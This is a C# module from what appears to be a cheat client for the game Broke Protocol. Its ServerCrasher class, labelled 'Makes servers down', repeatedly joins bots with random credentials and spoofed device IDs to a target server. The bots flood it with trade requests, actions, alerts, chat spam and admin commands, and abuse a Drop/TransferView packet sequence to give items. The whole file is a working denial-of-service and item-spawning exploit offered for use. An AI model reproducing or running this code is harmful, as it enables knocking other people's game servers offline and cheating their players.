using BrokeProtocol.Client.UI;
using BrokeProtocol.Entities;
using BrokeProtocol.Managers;
using BrokeProtocol.Required;
using BrokeProtocol.Utility;
using BrokeProtocol.Entities;
using BrokeProtocol.Collections;
using BrokeProtocol.Utility.Networking;
using BrokeProtocolClient.settings;
using BrokeProtocolClient.utils;
using ENet;
using HarmonyLib;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using UnityEngine;
using BrokeProtocolClient.modules.exploit.botter;
using System.Collections.ObjectModel;

namespace BrokeProtocolClient.modules.exploit
{
    class ServerCrasher : Module
    {
        BotManager manager;



        InputSetting hostName = new InputSetting("Host name", 15, "127.0.0.1");
        InputSetting port = new InputSetting("Port", 5, "5557");
        ActionSetting current;

        BooleanSetting give_spam = new BooleanSetting("Spamming Give", false);
        InputSetting itemName = new InputSetting("Item name", 32, "Colt");
        InputSetting amount = new InputSetting("Item amount", 32, "");
        BooleanSetting flood_chat = new BooleanSetting("Flood Chat", false);
        InputSetting flood_chat_msg = new InputSetting("Chat Message", 64, "DarlogCheat On Top!");

        NumberSetting delay = new NumberSetting("Delay (seconds)", 0, 10, 0.1, 0.1);

        IEnumerator spammer;

        List<ShPlayer> entities = new List<ShPlayer>();

        Bot bot;

        public ServerCrasher() : base(Categories.Exploit, "ServerCrashers", "Makes servers down")
        {
            manager = new BotManager();

            addSetting(hostName);
            addSetting(port);
            current = new ActionSetting("Current", currentserver);
            addSetting(current);
            addSetting(give_spam);
            addSetting(itemName);
            addSetting(amount);
            addSetting(flood_chat);
            addSetting(flood_chat_msg);

            addSetting(delay);
        }

        public override void onActivate()
        {
            if (spammer != null) return;

            spammer = SpammerThread();
            getClient().StartCoroutine(spammer);
        }

        public override void onDeactivate()
        {
            if (spammer == null) return;

            getClient().StopCoroutine(spammer);
            spammer = null;
        }

        public override void onRender()
        {

        }

        public override void onUpdate()
        {

        }


        private void GiveItem(Bot b)
        {
            string searchedName = itemName.getValue();

            ShItem item;
            if (!getClient().SceneManager.TryGetEntity<ShItem>(searchedName, out item))
            {
                Log($"Item {searchedName} not found, similar items:");
                foreach (ShEntity entity in getClient().SceneManager.entityCollection.Values)
                {
                    if (entity.name.ToLower().Contains(searchedName.ToLower()))
                        ConsoleBase.Write($"{entity.name} ");
                }
                ConsoleBase.WriteLine("");
                return;
            }

            // Send Drop packet so localplayer.otherEntity != null server-side.
            b.SendToServer(PacketFlags.Reliable, SvPacket.Drop, new object[] { });

            // Some fucking magic
            b.SendToServer(PacketFlags.Reliable, SvPacket.TransferView, new object[]
            {
                (byte)1,
                item.index,
                Int32.Parse(amount.getValue())
            });

            

            Log($"Successfully gave to {b.username} {amount} {item.itemName}");
        }

        public void currentserver()
        {
            bool inGame = getClient().ClManager != null;

            hostName.setValue(inGame ? getClient().ClManager.connection.IP : "");
            port.setValue(inGame ? getClient().ClManager.connection.Port.ToString() : "");
        }

        private IEnumerator SpammerThread()
        {

            while (true)
            {
                yield return new WaitForSeconds(delay.getValueFloat());

                for (int i = 0; i < 6; i++)
                {
                    string username = utils.Utils.RandomString(16);
                    string password = utils.Utils.RandomString(16);
                    string deviceID = utils.Utils.RandomString(SystemInfo.deviceUniqueIdentifier.Length);

                    bot = new Bot(username, password, 2, 2, deviceID, "");

                    manager.AddBot(bot, hostName.getValue(), ushort.Parse(port.getValue()));
                }

                yield return new WaitForSeconds(0.5f);

                entities.AddRange((EntityCollections.Humans as Collection<ShPlayer>).ToList());

                foreach (ShPlayer e in entities)
                {
                    TradeSpam(bot, e);
                    HandsUp(bot, e);
                    bot.SendToServer(ENet.PacketFlags.Reliable, SvPacket.Alert, Array.Empty<object>());
                    

                    if (flood_chat.isEnabled())
                    {
                        bot.SendGlobalMessage(flood_chat_msg.getValue());
                    }

                    if (give_spam.isEnabled())
                    {
                        GiveItem(bot);
                    }

                    SlowServer(bot);
                }
            }
        }

        private void SlowServer(Bot b)
        {
            b.SendGlobalMessage("/slowmo 100");
            b.SendGlobalMessage("/SlowMo 100");
            b.SendGlobalMessage("/give d 999");
            b.SendGlobalMessage("/godmode");
        }

        private void HandsUp(Bot b, ShPlayer player)
        {
            b.SendToServer((PacketFlags)1, SvPacket.EntityAction, new object[]
            {
                player.ID,
                "HandsUp"
            });
        }

        private void TradeSpam(Bot b, ShPlayer pl)
        {
            if (!pl.IsDead || !pl.Shop)
            {
                b.SendToServer((PacketFlags)1, SvPacket.TradeRequest, new object[]
                {
                        pl.ID
                });
            }
        }
    }
}
